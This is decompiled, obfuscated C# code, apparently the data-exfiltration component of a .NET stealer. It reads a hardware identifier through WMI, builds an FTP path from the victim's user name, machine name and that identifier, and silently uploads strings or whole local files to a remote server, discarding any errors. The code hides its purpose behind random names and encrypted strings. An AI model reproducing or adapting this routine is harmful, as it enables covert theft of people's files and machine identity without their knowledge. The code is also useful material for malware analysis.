using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

internal sealed class SHmEmUJzpQiHhCI
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string tZpszotMedUsQ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107368412));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107368359)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107368374);
			ManagementObject val3 = new ManagementObject(getString_0(107367825) + text2 + getString_0(107367784));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107367811)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107359548) : text;
		}
	}

	public static void PjSMUDlVOROdzL(string eFpqRfRSfhtbb = "URL", string kkEImoveWY = "USERNAME", string QyEJqToIuRHj = "ACCESO", string ZwVKbLGFroxdZ = "")
	{
		try
		{
			string text = tZpszotMedUsQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(eFpqRfRSfhtbb + getString_0(107371836) + Environment.UserName + getString_0(107371791) + Environment.MachineName + getString_0(107371802) + text + getString_0(107371765));
			ftpWebRequest.Method = getString_0(107367754);
			ftpWebRequest.Credentials = new NetworkCredential(kkEImoveWY, QyEJqToIuRHj);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(ZwVKbLGFroxdZ);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void eufLNraWLMStF(string hWReyEshexHEIrd = "URL", string QntoENxocq = "USERNAME", string zDeNnEVQzkQJv = "ACCESO", string nOsOXujJNxgq = "")
	{
		try
		{
			string text = tZpszotMedUsQ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(hWReyEshexHEIrd + getString_0(107371836) + Environment.UserName + getString_0(107371791) + Environment.MachineName + getString_0(107371802) + text + getString_0(107371802) + Path.GetFileName(nOsOXujJNxgq));
			ftpWebRequest.Method = getString_0(107367754);
			ftpWebRequest.Credentials = new NetworkCredential(QntoENxocq, zDeNnEVQzkQJv);
			byte[] array = File.ReadAllBytes(nOsOXujJNxgq);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static SHmEmUJzpQiHhCI()
	{
		Strings.CreateGetStringDelegate(typeof(SHmEmUJzpQiHhCI));
	}
}
